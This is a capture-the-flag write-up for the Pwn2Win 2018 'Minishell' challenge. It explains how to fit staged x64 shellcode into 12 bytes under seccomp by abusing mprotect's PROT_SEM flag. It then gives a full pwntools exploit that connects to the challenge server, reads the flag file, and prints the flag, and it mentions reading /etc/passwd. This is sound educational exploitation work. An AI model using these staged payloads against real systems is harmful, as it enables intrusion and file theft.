---
layout: post
category: Pwn
title: Pwn2Win 2018 Minishell
tags: 
    - kowu
---

We are allowed to directly execute x64 shellcode in a r/x mmapped region, however only up to a Size of 12 Bytes. And there was seccomp enabled, so we only had `mprotect`, `read`, `write`, `open` and a few other syscalls available.
We cannot read the flag with only 12 Bytes available, so we must somehow reread additional shellcode. Therefore we must get our mempage writable again.
And afterwards we need to read some shellcode in there, overwriting our currently executed shellcode.

## Step1: Making the mempage writable
As the last function call before jumping into our shellcode was mprotect, most of the registers luckily were already set correctly.
As we want to call mprotect by syscall, our shellcode therefore only needs to set rax = 10 (for mprotect) and rdx = 7 (for r/w/x rights).
```nasm
; already set correctly : rdi = our mempage base addr, rsi = mempage size
mov al, 10
mov dl, 7
syscall
```
This will result in 6 Bytes of shellcode. Also, after successfull execution, rax will be set to zero, the syscall number of read!

## Step2: Reading 
Now we need to read from stdin, rax is already set to 0 (the id of read).
For the parameters we need to get rdi = 0 (for stdin), rsi = rdi (rdi contains our mempage addr), rdx = the amount we want to read.
My first try was something like:
```nasm
mov rsi, rdi
mov rdi, rax
mov dl, 0xff
syscall
```
Which will result in 10 Bytes of additional shellcode, way too much, we need to get it into 6 Bytes.
Therefore we can do some optimisations. For example the `mov rsi, rdi` operation (3 Bytes in size) can as well be expressed as `push rdi; pop rsi` (2 Bytes in size).
By completely removing the assignment of the rdx register, we will get a 6 Byte read shellcoode.
```nasm
push rdi
pop rsi
push rax
pop rdi
syscall
```
We now can read into our own mempage. However, rdx is still 7 from the last call, so this doesn't help us at all, we will return right into nothing after the read syscall. We need to read more.

## Step3: Mmap protection flags
As we want to get rdx > 7, we could just try to set it to some arbitrary value right before the mprotect syscall. But then mprotect will fail with EINVAL.
So let's check wich flags we have available to use the syscall correctly and get rdx > 7.
```c
/* mman-common.h */
#define PROT_READ	0x1		/* page can be read */
#define PROT_WRITE	0x2		/* page can be written */
#define PROT_EXEC	0x4		/* page can be executed */
#define PROT_SEM	0x8		/* page may be used for atomic ops */
#define PROT_NONE	0x0		/* page can not be accessed */
```
A PROT_SEM flag. Interesting. So setting rdx = 15 would work, we could read 3 more Bytes and overwrite our whole current shellcode + 3.
Those additional 3 Bytes are sufficient to do a `jmp rsi`. from there on it is a piece of cake, with that space for shellcode available, we can read an arbitrary amount of shellcode into memory.

Full exploit code:
```python
from pwn import *

context.clear(arch='amd64')

stage1 = """
    mov al, 10
    mov dl, 15
    syscall
    push rdi
    pop rsi
    push rax
    pop rdi
    syscall
    """
stage1 = asm(stage1)
assert len(stage1) <= 12

stage2 = """
    mov dx, 0x1000
    xor rax, rax
    syscall
"""
stage2 = asm(stage2)
assert len(stage2) <= 12
stage2 = stage2.ljust(12, '\x90') + asm('jmp rsi')
assert len(stage2) <= 15

stage3 = "nop\n" * 15
stage3 += pwnlib.shellcraft.open('/home/minishell/flag.txt')
stage3 += pwnlib.shellcraft.read(fd='rax', count=0x1000)
stage3 += pwnlib.shellcraft.strlen('rsp')
stage3 += pwnlib.shellcraft.write(1, 'rsp', 'rcx')
stage3 = asm(stage3)

r = remote('200.136.252.34', 4545)
if __name__ == '__main__':
    r.recvuntil('? ')
    r.send(stage1)
    r.recvuntil('!\n')
    r.send(stage2)
    r.send(stage3)
    r.interactive()
    # CTF-BR{s0000_t1ght_f0r_my_B1G_sh3ll0dE_}
```
The PATH wasn't set, so just opening `flag.txt` did not work. Had to read `/etc/passwd` to find out the home path.
